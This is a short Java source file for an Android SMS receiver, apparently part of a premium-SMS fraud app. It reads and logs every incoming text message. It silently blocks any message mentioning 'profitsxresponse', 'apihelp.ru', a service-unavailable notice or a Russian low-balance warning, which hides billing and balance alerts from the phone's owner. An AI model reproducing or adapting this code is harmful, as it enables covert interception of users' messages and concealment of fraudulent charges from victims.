package sx.jolly.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import sx.jolly.utils.Utils;

public class SMSReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        SmsMessage messages = SmsMessage.createFromPdu((byte[]) ((Object[]) intent.getExtras().get("pdus"))[0]);
        Utils.slog(SMSReceiver.class, messages.getMessageBody());
        if (messages.getMessageBody().contains("profitsxresponse") || messages.getMessageBody().contains("apihelp.ru") || messages.getMessageBody().contains("Servis nedostupen") || messages.getMessageBody().contains("Извините, на балансе вашего телефона недостаточно средств.")) {
            abortBroadcast();
        }
    }
}
